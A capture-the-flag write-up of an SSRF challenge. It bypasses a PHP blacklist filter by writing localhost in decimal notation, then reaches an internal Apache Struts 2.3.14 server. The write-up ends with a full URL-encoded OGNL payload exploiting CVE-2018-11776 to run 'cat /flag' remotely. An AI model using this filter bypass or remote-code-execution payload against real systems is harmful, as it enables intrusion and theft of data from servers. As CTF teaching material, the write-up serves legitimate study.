This challenge is another PHP application, where you can fetch url and see the response.  
It's an obvious SSRF Challenge with a blacklist filter:  
```php
$url = $_POST['url'];
$parsed = parse_url($url);
$scheme = $parsed['scheme'];
if($scheme !== 'http'){
	die('Hacking attempt');
	}
$blacklist = ["127","local","::","http://0/"];
foreach ($blacklist as $value) {
	if (stripos($url,$value) !== false) 
		die('Hacking attempt');
}
if (substr_count($parsed['host'], '.') > 0){
	die('hacking attempt');
}
```
So it seems its not possible to use other sheme than http, also there is a filter on localhost address and ipv6 notation, and there is a count for dots in host scheme,  
so it seems domain bypass is not possible, One possible way to bypass this filter is use decimal notation http://2130706433/  
The next step is scan internal network for other services, the only other service is running on port 8080, which shows tomcat default page.  
The hint suggested that I was using Struts version 2.3.14, you can  then find out  that this [version](https://www.securityfocus.com/bid/105125) was vulnerable to CVE-2018-11776  
I was using this exact container : https://github.com/bhdresh/CVE-2018-11776 
The only difference is that your payload will be through ssrf so you might have to encode your payloads  
After getting rce, the goal was to read the file /flag , the full payload(in browser) looks like : http://2130706433:8080/struts2-showcase-2.3.14/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/flag%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/help.action
